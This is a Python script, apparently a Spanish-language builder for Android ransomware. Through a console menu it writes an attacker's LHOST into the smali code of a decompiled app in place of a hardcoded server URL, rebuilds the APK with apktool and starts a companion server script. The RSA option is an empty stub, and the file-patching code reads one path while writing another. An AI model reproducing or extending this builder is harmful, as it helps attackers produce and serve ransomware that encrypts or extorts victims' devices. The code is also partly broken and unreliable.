import cowsay
import fileinput
import os
import time

#daemon
#ghostbusters
def ip(lhost):
	archivo = r"C:\Users\Luis_Ramirez\Desktop\ransonware\Aplicacion\smali_classes2\com\example\flask2"
	busqueda = 'const-string v2, "http://10.10.10.54:5000/"'
	remplazar = "const-string v2, " + lhost
	f = open(archivo + r'\MainActivity.smali', 'r+')
	for line in fileinput.input('MainActivity.smali'):
		f.write(line.replace(busqueda, remplazar))
	f.close()
	input("Su ip ha sido ingresada a la aplicacion presione cualquier tecla para continuar......")


def Generar():
	print("Generando el .apk")
	time.sleep(2)
	os.system("apktool b Aplicacion")
	time.sleep(2)
	input("Su aplicacion esta generada presione cualquier tecla para continuar......")

def servidor():
	print("Activado el servidor...")
	time.sleep(2)
	os.system("python api.py")

def Rsa():
	pass

def salir():
	exit()


def menu():
	cowsay.daemon(" Ransonware Android")
	print("                                                  @DC5411 (@larm182, @Adanzx)")
                                      

	#print("\n")
	print("     ************************** Menu Principal ******************************")
	#print("\n")
	print("\t Siga los siguientes pasos: ")
	#print("\n")
	print("\t 1) Para Ingresar El Target")
	print("\t 2) Para Crear el .Apk  ")
	print("\t 3) Para Subir El .Apk Servidor ")
	print("\t 4) Activar Servidor RSA ")
	print("\t 5) Salir ")

while True:
	menu()
	opcionMenu = input("Ingresar una opcion >> ")

	if opcionMenu == '1':

		lhost = input( "Ingresar LHOST >> ")
		ip(lhost)

	if opcionMenu == '2':
		Generar()
	if opcionMenu == '3':
		servidor()
	if opcionMenu == '4':
		Rsa()
	if opcionMenu == '5':
		salir()












  